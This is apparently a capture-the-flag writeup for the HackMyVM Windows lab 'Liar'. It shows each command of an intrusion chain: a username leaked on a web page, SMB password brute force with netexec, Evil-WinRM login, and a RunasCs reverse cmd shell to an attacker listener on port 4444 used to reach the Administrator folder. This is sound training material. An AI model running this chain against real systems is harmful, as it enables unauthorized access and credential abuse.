# Liar — HackMyVM Writeup

**Platform:** HackMyVM  
**OS:** Windows  
**Difficulty:** Easy  
**Author:** Shalopai  
**Techniques:** Web Enumeration, SMB Brute Force, RunasCs (Lateral Movement), Administrators Group Abuse

---

## Summary

Liar is an Easy-rated Windows machine that doesn't involve Active Directory — just a standalone Windows box with two local users. The attack begins with discovering a username from a webpage on the IIS server. SMB brute force reveals the password for the first user, giving WinRM access. Inside, a second user is discovered who belongs to the Administrators group but has no WinRM access. RunasCs is used to execute a reverse shell as that user, and their Administrators group membership grants access to the root flag.

---

## Reconnaissance

### Network Discovery

```bash
sudo netdiscover -r 192.168.56.0/24
```

Target identified at `192.168.56.102`.

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn 192.168.56.102
```

**Key results:**

| Port | Service |
|------|---------|
| 80   | HTTP — Microsoft IIS 10.0 |
| 445  | SMB |
| 5985 | WinRM |

Windows machine with IIS web server, SMB, and WinRM — no Active Directory (no port 88 Kerberos, no port 389 LDAP).

---

## Enumeration

### Web Application — Username Discovery

Visiting `http://192.168.56.102` reveals a message left on the page:

```
Hey bro, You asked for an easy Windows VM, enjoy it. - nica
```

**Username discovered: `nica`**

This is a simple but important recon step — web pages, HTML comments, and error messages often leak usernames that can be used for further attacks.

---

## Exploitation — SMB Brute Force

With a valid username, we brute force the SMB service using rockyou.txt:

```bash
netexec smb 192.168.56.102 -u 'nica' -p /home/shalopai/Desktop/rockyou-75.txt
```

```
[+] WIN-IURF14RBVGV\nica:hardcore
```

**Credentials found: `nica:hardcore`**

### Initial Access via Evil-WinRM

Since port 5985 (WinRM) is open and nica has valid credentials:

```bash
evil-winrm -i 192.168.56.102 -u nica -p 'hardcore'
```

```
*Evil-WinRM* PS C:\Users\nica>
```

### User Flag

```
*Evil-WinRM* PS C:\Users\nica> cat user.txt
HMVWINGIFT
```

---

## Post-Exploitation — User Enumeration

```
*Evil-WinRM* PS C:\Users\nica> net user
```

```
Administrador    akanksha    DefaultAccount
Invitado         nica        WDAGUtilityAccount
```

A second non-default user `akanksha` exists. We brute force their password:

```bash
netexec smb 192.168.56.102 -u 'akanksha' -p /home/shalopai/Desktop/rockyou-75.txt
```

```
[+] WIN-IURF14RBVGV\akanksha:sweetgirl
```

**Credentials found: `akanksha:sweetgirl`**

### Why Evil-WinRM Fails for akanksha

```bash
evil-winrm -i 192.168.56.102 -u 'akanksha' -p 'sweetgirl'
# Error: WinRM::WinRMAuthorizationError
```

`akanksha` has valid credentials but is **not in the Remote Management Users group** — meaning WinRM access is denied. However, checking their group membership reveals they are in the **Administrators group**, which gives them elevated local privileges. We just need a different way to execute commands as them.

---

## Privilege Escalation — RunasCs

### What is RunasCs?

**RunasCs** is a Windows utility that allows running processes as a different user, similar to Linux's `su` command. Unlike the built-in Windows `runas`, it works non-interactively and can send output to a remote listener — making it ideal for lateral movement when a user has credentials but no direct shell access.

### Upload RunasCs

From the nica Evil-WinRM session:

```
*Evil-WinRM* PS C:\Users\nica> upload RunasCs.exe
```

### Set Up Listener

On the attacker machine:

```bash
rlwrap nc -lvp 4444
```

### Execute Reverse Shell as akanksha

```
*Evil-WinRM* PS C:\Users\nica> .\RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.56.101:4444
```

```
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Async process 'cmd.exe' with pid 1860 created in background.
```

A CMD shell connects back as `akanksha`:

```
C:\Windows\system32> whoami
win-iurf14rbvgv\akanksha
```

### Accessing Administrator Directory

`akanksha` is in the Administrators group, which grants read access to other user directories including Administrator:

```
C:\> cd C:\Users\Administrador
C:\Users\Administrador> dir
```

```
root.txt     13 bytes
```

> **Note:** On this machine the interface is in Spanish — `Administrador` instead of `Administrator`, `dir` instead of `ls`, `type` instead of `cat`.

### Root Flag

```
C:\Users\Administrador> type root.txt
HMV1STWINDOWZ
```

---

## Attack Chain Summary

1. **Web Enumeration** — IIS webpage leaks username `nica` in a message left on the site
2. **SMB Brute Force** — netexec with rockyou.txt recovers `nica:hardcore`
3. **WinRM Access** — Evil-WinRM grants shell as `nica`; user flag retrieved
4. **User Enumeration** — `net user` reveals second account `akanksha`; brute force recovers `akanksha:sweetgirl`
5. **RunasCs Lateral Movement** — `akanksha` can't use WinRM but is in Administrators; RunasCs spawns reverse CMD shell as `akanksha`
6. **Administrators Abuse** — Administrators group membership grants access to `C:\Users\Administrador`; root flag retrieved

---

## Lessons Learned

- **Web pages leak sensitive information.** A username in a "hey bro" message was the entire initial foothold. Always read page source and content carefully.
- **SMB brute force is still effective.** Weak passwords like `hardcore` and `sweetgirl` are common on standalone Windows boxes without domain password policies.
- **WinRM access ≠ local admin.** A user can be in the Administrators group and have a valid password, but still be blocked from WinRM if they're not in the Remote Management Users group. These are separate permissions.
- **RunasCs fills the gap between "has credentials" and "has shell".** When a user can't access WinRM or RDP but you have their password, RunasCs lets you execute commands and get a reverse shell as that user.
- **Windows CMD vs PowerShell.** The reverse shell via RunasCs drops into CMD, not PowerShell — `ls` doesn't work, use `dir` and `type` instead.

---

*Machine: Liar | Platform: HackMyVM | Writeup by Shalopai*